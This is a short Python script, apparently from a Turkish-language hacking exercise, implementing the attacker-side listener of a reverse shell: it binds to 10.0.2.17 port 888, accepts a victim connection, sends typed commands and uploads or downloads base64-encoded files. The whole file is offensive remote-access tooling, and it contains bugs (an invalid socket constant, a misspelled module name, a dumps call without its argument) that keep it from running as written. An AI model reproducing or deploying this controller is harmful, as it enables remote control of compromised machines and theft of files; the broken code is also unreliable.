import socket
import simplejson
import base64

class Lister:
    def __init__(self,ip,port):
        self.baglanti = socket.socket(socket.AF_INET,socket.SOCK)
        self.baglanti.setsockopt(socket.SOL_SOCKET,socke.SO_REUSEADDR,1) 
        self.baglanti.bind((ip,port))
        self.baglanti.listen(0)
        print("Dinlemeye Basladi!")

        self.baglan,adres = self.baglanti.accept()
        print("baglanti kabul edildi. "+str(adres))

    def paketleme(self,veri):
        paket = simplejson.dumps()
        self.baglan.sendall(paket.encode("utf-8"))  #byte a çevir
        if veri[0]=="çıkış":
            self.baglanti.close()
            exit()


    def paket_coz(self):
        gelen_veri = ""
        while True:
            try:
                gelen_veri = gelen_veri + self.baglan.recv(1024).decode("utf-8")
                return simplejson.loads(gelen_veri)
            except ValueError:
                continue
       
    def baslatma(self):
        while True:
            giris = input("Komut Gir: ")
            giris = giris.split(" ")
            try:
                if giris[0]=="yükle":
                    with open(giris[1],"rb") as dosya1:
                        veri3 = base64.b64encode(dosya1.read())
                        giris.append(veri3)
                self.paketleme(giris)
                cikti = self.paket_coz()
                if giris[0]=="indir" and "Hata!" not in cikti:
                    with open(giris[1],"wb") as dosya:
                        dosya.write(base64.b64decode(cikti))
                    cikti = giris[1]+" inidirildi."
            except Exception:
                cikti = "Hata!"
            print(cikti)
            


baglanti_kurma=Lister("10.0.2.17",888)
baglanti_kurma.baslatma()



